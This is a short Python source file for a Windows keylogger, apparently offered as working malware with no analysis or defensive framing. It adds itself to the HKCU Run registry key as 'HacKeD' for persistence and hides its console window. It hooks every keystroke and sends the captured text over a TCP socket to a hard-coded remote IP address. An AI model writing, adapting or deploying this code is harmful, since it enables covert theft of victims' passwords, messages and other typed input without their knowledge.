#!/usr/bin/python
import  pyHook, pythoncom
import socket
import win32event, win32api, winerror
from _winreg import *

def AddProgramToStartup():
    fp=os.path.dirname(os.path.realpath(__file__))
    file_name="maleware.py"
    new_file_path=fp+"\\"+file_name
    #print new_file_path
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change= OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)
    SetValueEx(key2change, "HacKeD",0,REG_SZ, new_file_path)



data=''
HOST_IP="192.168.4.78"
def SendToRemoteServer():
    global data
    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST_IP, 500))
    sock.send(data)
    sock.close()
    return True

def HideCmd():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def GetKeyPressedAndSendIt(event):
    global data
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    data=data+keys
    HideCmd()
    SendToRemoteServer()


AddProgramToStartup()
hm = pyHook.HookManager()
hm.KeyDown = GetKeyPressedAndSendIt
hm.HookKeyboard()
pythoncom.PumpMessages()
